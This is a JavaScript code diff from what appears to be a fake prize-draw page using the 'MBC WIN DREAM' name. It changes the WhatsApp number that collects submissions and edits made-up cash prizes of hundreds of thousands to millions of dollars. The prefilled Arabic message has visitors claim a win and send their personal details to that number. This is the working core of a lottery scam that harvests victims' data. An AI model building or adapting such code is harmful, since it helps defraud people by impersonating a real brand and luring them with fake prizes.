@@ -1,21 +1,21 @@
 // --- 0. CRITICAL SETUP VARIABLES ---
-const YOUR_WHATSAPP_NUMBER = "+212 783-280040"; 
+const YOUR_WHATSAPP_NUMBER = "+13215054515"; 
 const WHATSAPP_MESSAGE =
     "مرحباً! لقد فزت بجائزة في سحب MBC WIN DREAM. هذه بياناتي لاستلام الجائزة:"; 
 
 // --- PRIZE TIERS (MONEY ONLY) ---
 const prizes = [
     {
-        name: "مبلغ 1,000,000 دولار + ثلاجة + جهاز PlayStation 5",
+        name: "مبلغ 500,000 دولار + ثلاجة + جهاز PlayStation 5",
+        amount: 500000
+    },
+    {
+        name: "مبلغ 800,000 دولار + سيارة + تلفاز",
+        amount: 800000
+    },
+    {
+        name: "مبلغ 1000,000 دولار نقداً",
         amount: 1000000
-    },
-    {
-        name: "مبلغ 2,000,000 دولار + سيارة + تلفاز",
-        amount: 2000000
-    },
-    {
-        name: "مبلغ 3,000,000 دولار نقداً",
-        amount: 3000000
     }
 ];
 
